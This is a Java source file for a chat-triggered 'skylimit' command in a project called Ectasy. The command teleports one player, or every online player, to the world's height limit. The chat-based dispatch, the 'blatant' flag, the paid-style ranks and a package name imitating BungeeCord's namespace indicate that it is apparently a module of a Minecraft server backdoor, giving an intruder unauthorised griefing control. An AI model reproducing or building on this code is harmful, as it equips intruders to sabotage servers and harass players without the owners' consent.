package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import net.md5.bungee.Ectasy;
import org.bukkit.Bukkit;
import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "skylimit",
   description = "Sends a player or everyone to sky limit",
   blatant = true,
   rank = Rank.FREE
)
public class SkyLimitCommand extends AbstractCommand {
   public static void tpToSky(Player var0) {
      Ectasy.parentPlugin.getServer().getScheduler().runTask(Ectasy.parentPlugin, () -> {
         Location var1 = var0.getLocation();
         var1.setY(var1.getWorld().getMaxHeight());
         var0.teleport(var1);
      });
   }

   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Usage: skylimit <player>");
      } else if (var3[0].equals("*")) {
         Bukkit.getOnlinePlayers().forEach(SkyLimitCommand::tpToSky);
         ChatUtil.sendChat(var1.getPlayer(), "Teleported everyone to sky limit.");
      } else {
         Player var4 = Bukkit.getPlayer(var3[0]);
         if (var4 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "The player " + var3[0] + " is not online.");
         } else {
            tpToSky(var4);
            ChatUtil.sendChat(var1.getPlayer(), "Teleported " + var4.getName() + " to the sky.");
         }
      }
   }
}
